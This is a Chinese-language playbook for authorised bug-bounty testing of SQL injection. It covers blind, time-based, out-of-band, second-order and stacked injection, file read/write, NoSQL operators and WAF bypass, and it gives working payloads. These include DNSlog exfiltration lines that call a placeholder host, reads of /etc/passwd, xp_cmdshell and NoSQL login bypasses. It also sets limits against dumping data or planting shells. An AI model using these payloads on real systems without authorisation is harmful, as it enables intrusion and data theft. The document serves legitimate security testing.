# SQL 注入进阶（盲注 / 带外 / 二次 / 写文件）

> 定位：`injection-test.md` 是**总览与快速检测**，本篇是**打深**。总览里「快速检测」四枪没差分就该停；本篇只在**已确认有差分面**的口上用。
> **实战案例（双向引用）** → `sqli-cases.md`（ima `src报告/SQL注入/` 97 条 → 72 份唯一 → 实读 18）：真实注入点、WAF 绕过与 payload、厂商定级尺度；回查原文见 `ima-retrieval-index.md` §三。

> 冲突以 `rules/src-value-hunting.md` §3 为准：按栈选探针，不封顶，但**不在无差分面上堆 payload**。

---

## 0. 先决条件：哪些口值得上重武器

进本篇前先答一句：**这个口有没有差分面？** 满足任一才继续：

| 差分信号 | 说明 |
|---|---|
| 条数变 | `total` / `count` / 列表长度随 payload 变 |
| 内容变 | 返回字段值随 payload 变（不只是结构） |
| 报错变 | 500 / SQL 关键字 / 栈信息随 payload 出现或消失 |
| 延时变 | 同一请求稳定多出固定秒数 |
| 重定向变 | 302 有无 / Location 内容随 payload 变 |

**没有差分面 → 直接停**，回 `src-value-hunting` §3 打别的类型。不要在无差分面上试盲注——盲注的成本高，只用在已经证明「有注入」但「看不见回显」的口。

---

## 1. 布尔盲注

**适用**：有注入但回包结构不变，只有「真/假」两种状态可分。

### 判定
```
基线：  ?id=1
探针1： ?id=1 and 1=1     → 应与基线一致
探针2： ?id=1 and 1=2     → 应与基线不同
```
两者不一致 = 布尔盲注成立。**必须两条都打**，只打一条不能证明。

### 常见「真假」表现（不要只盯回包正文）
- 列表条数 `total` 不同
- HTTP 状态码不同（200 / 404 / 500）
- 响应头长度不同（`Content-Length`）
- 有无 `Set-Cookie`
- 302 有无 / Location 不同
- 页面里某个字段在 / 不在

### 提速：二分法
```
and ascii(substr((select database()),1,1))>100
```
逐字符二分，每个字符约 7 次请求。**注意限流**（见 `ratelimit-abuse-test.md`），必要时降到每字符 3 次。

### 假点
- `and 1=1` 与 `and 1=2` 回包完全一致 → 无差分，停
- 参数被引号包裹但服务端转义了引号 → 改用数字型探针（`?id=1 and 1=1` 不带引号）再判
- 回包差异来自缓存 / CDN，不是数据库 → 加随机 `&_=随机数` 破缓存重测

---

## 2. 时间盲注

**适用**：布尔无差分（回包完全一样），但能观察到稳定延时。

### 各库函数
| 库 | 探针 |
|---|---|
| MySQL | `sleep(5)` / `benchmark(5000000,md5(1))` |
| MSSQL | `waitfor delay '0:0:5'` |
| PostgreSQL | `pg_sleep(5)` |
| Oracle | `dbms_pipe.receive_message(('a'),5)` |
| SQLite | `randomblob(100000000)`（耗 CPU 造延时） |

### 正确做法
1. **先测基线**：同一请求连打 3 次，记录耗时（如 200ms / 210ms / 195ms）
2. **再打探针**：同一请求带 `sleep(5)`，连打 3 次
3. **对比**：稳定多出 ~5s 才算成立

**只打一次就断言 = 假结论**。网络抖动、后端 GC、冷启动都能造出 2-3s 波动。

### 假点
- 延时不稳定（3 次差异大）→ 网络抖动，不是注入
- 所有 payload 都延时（包括 `sleep(0)`）→ 是目标本身慢
- WAF 拦了 `sleep` 关键字 → 换 `benchmark` / 换库函数，别当成无注入
- 云函数 / Serverless 有执行上限 → 5s 可能超时断连，改用 2s

---

## 3. 带外 OOB（DNSlog）

**适用**：无回显、无延时、盲到底。**先确认目标能出网**——内网目标常常不能。

### 各库载荷
| 库 | 载荷 |
|---|---|
| MySQL | `load_file(concat('\\\\',(select database()),'.dnslog.xxx\\a'))` |
| MSSQL | `exec master..xp_dirtree '\\dnslog.xxx\a'` |
| Oracle | `UTL_HTTP.request('http://dnslog.xxx/'||(select user from dual))` |
| PostgreSQL | `copy (select '') to program 'curl http://dnslog.xxx/'` |
| Java 应用 | 走 `jndi-injection-test.md` 的 JNDI 路径 |

### 平台
`dnslog.cn` / `ceye.io` / `interact.sh`（任选，注意平台本身的可用性）

### 假点
- **只出 DNS 不出 HTTP** → 目标只通了 UDP/53，TCP/80 被墙。能证明「有出网」，但拿不回数据
- 目标在内网且无出网权限 → 出不去，别当没注入，是打不了 OOB
- DNS 被内网 DNS 劫持 → 收到的记录不是目标的
- 云厂商元数据 DNS 也能通 → 别把元数据回显当成你的 DNSlog

### SRC 红线
OOB 只用来**证明注入存在并带出少量标识数据**（库名、用户名的哈希前缀）。**禁止**用它拖库、禁止把它当数据通道。

---

## 4. 二次注入

**适用**：写入时转义、读取时拼接。典型场景——改用户名 / 改备注 / 建标签 / 存草稿，然后**后续某个查询依赖这个字段**。

### 打法
1. 找一个「写进去、之后被读出来参与查询」的字段
2. 写入 `admin'--` 或 `test' and '1'='1`
3. 触发依赖该字段的查询（改密、改绑、下单、导出、搜索）
4. 观察差分

**关键**：写入那一步**通常不报错**（转义了），要在**读取那一步**才看差分。只测写入会漏。

### 假点
- 写入转义且读取也转义 → 无洞
- 字段只用于展示、从不参与 SQL → 无洞

---

## 5. 堆叠查询

**支持**：MSSQL / PostgreSQL / MySQL（需驱动允许多语句）
**不支持**：Oracle（默认）、PHP `mysql_query`（单语句）

```
;select 1
;drop table t--     ← 禁止，破坏性
;update t set ...   ← 谨慎，只改自己能改回的
```

**SRC 红线**：堆叠只用来**证明能执行第二条语句**（如 `;select sleep(5)`），**禁止** `drop` / `delete` / `truncate` / 批量 `update`。

---

## 6. 注入 → 文件读写 / RCE

**只在有明确证据时跟，且遵守最小伤害。**

| 库 | 读文件 | 写文件 | 命令执行 |
|---|---|---|---|
| MySQL | `load_file('/etc/passwd')` | `into outfile`（需 FILE 权限 + `secure_file_priv` 允许） | 无原生 |
| MSSQL | `bulk insert` | `xp_cmdshell` 配合 | `xp_cmdshell` / `sp_oacreate`（需 sysadmin） |
| PostgreSQL | `pg_read_file` | `copy ... to` | `copy ... to program`（需超级用户） |
| Oracle | `UTL_FILE` | `UTL_FILE` | `dbms_java` / `dbms_scheduler` |

### 红线（对齐 `rules/vuln-report-format.md` 与 SKILL.md 安全红线）
- **读**：只读配置文件证明（`/etc/passwd` 一行、`web.config` 里一段）→ 足够
- **写**：**只写一个无害标记文件到自己可达的路径**（如 `tmp/poc_<随机>.txt`），写完删掉。禁止写 shell、禁止写 `.jsp` / `.php` 后门
- **命令执行**：只跑 `id` / `whoami` / `hostname` 这类**只读**命令。禁止反弹 shell、禁止持久化

**写成 `into outfile` 落地 webshell 的 = 越界，报告会被判无效甚至违规。**

---

## 7. 按栈选探针（衔接 `src-value-hunting` §3）

| 栈 | 探针方向 | 细节 |
|---|---|---|
| Java | HQL / SpEL / OGNL | 参数进 `@Query` / `SpEL` 表达式 |
| Node | NoSQL 操作符 | `{"user":{"$ne":null}}` / `{"$where":"..."}` |
| Python | Django ORM / SQLAlchemy | `filter(**kwargs)` 展开、`extra()` |
| PHP | 宽字节 / 二次 | `%df%27` 配 GBK |
| 通用 SQL | `'` / 布尔 / 延时 / WAF 编码 | 见 `waf-bypass.md` |

**NoSQL 操作符细节**（JSON body 场景最常命中）：
```json
{"username":"admin","password":{"$ne":"x"}}      // 绕过密码校验
{"username":{"$gt":""},"password":{"$gt":""}}    // 取第一个用户
{"$where":"sleep(5000)"}                          // MongoDB 时间盲注
```
**NoSQL 专篇（打深）** → `nosql-injection-test.md`：认后端（`MongoError` / 24 位 `_id` / JSON 可嵌套）→ **换 Content-Type 为 JSON** → `$regex` 逐位与 `$gt` 二分提数据 → `$where` / `$function` RCE（含 VM 逃逸，案例见 `sqli-cases.md` §D YApi）→ PHP 数组语法与 Node/Python/Java/Go 驱动差异；**27017/9200/6379 是未授权不是注入**。
**假点**：后端把 body 当字符串处理（没进查询对象）→ 操作符原样存储，无洞。

---

## 8. WAF 下的注入

被拦了**先换位置，再换编码**（顺序别反）：

1. **换位置**：query → JSON body → HTTP 头 → Cookie → path 段
2. **换编码**：`%0a` `%0d` 双写、大小写混用、内联注释 `/**/`、`+` 代替空格、URL 二次编码
3. **分块传输**：`Transfer-Encoding: chunked` 把 payload 拆开
4. **换探针类型**：布尔被拦改延时，延时被拦改 OOB

细节见 `waf-bypass.md`。**注意**：`src-value-hunting` §4 禁止「每个 path 丢 `'`」当 WAF 检测。

---

## 9. 自检（本篇）

- [ ] 上重武器前，是否确认了这个口**有差分面**？
- [ ] 布尔盲注是否**两条都打**（`1=1` 与 `1=2`）？
- [ ] 时间盲注是否做了**基线 + 3 次重复**，排除网络抖动？
- [ ] OOB 前是否确认目标**能出网**？
- [ ] 二次注入是否在**读取那一步**看差分（不是写入那一步）？
- [ ] 堆叠查询是否只用只读语句证明？
- [ ] 文件读写是否守住「只读一行配置 / 只写无害标记 / 只跑只读命令」？
- [ ] 按栈选探针了吗（Java 打 HQL/SpEL、Node 打操作符）？
- [ ] WAF 拦了是否**先换位置再换编码**？
- [ ] 有没有把「延时抖动」当注入、把「DNS 通但 HTTP 不通」当数据通道？

---

## 10. 一句话

**先证差分面，再上重武器；布尔打两条、延时打三次、OOB 先测出网、二次看读取步；堆叠只证明、读写只最小；按栈选探针，WAF 先换位置。**
